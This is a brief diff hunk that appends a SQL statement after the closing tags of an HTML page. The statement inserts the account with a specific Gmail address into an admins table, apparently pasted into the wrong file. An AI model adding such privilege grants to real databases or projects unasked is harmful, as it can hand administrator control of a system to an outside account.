@@ -1498,3 +1498,5 @@ checkUser();
 
 </body>
 </html>
+
+insert into admins select id from auth.users where email='kazmpour1392@gmail.com' on conflict do nothing;
